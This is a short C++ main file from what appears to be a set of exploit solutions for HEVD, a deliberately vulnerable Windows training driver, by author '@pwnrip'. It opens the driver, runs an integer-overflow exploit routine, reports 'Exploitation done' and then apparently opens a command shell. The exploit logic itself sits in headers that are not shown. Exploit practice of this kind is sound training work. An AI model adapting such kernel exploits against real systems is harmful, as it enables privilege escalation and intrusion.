// HEVDSolutions.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>

#include "common.h"
#include "StackOverflow.h"
#include "TypeConfusion.h"
#include "IntegerOverflow.h"

int main()
{

	HANDLE	hDevice;

	system("cls");

	cout << "\t\t\tHEVD Solutions" << endl;
	cout << "\t\t\t\t\t -- Himanshu Khokhar (@pwnrip)" << endl << endl;

	hDevice = getDriverHandle(driverName);

	if (!exploitIntegerOverflow(hDevice))
		return 1;

	cout << "\t\t[+] Exploitation done." << endl;

	getCmd();

	closeHandle(hDevice);

	return 0;
}
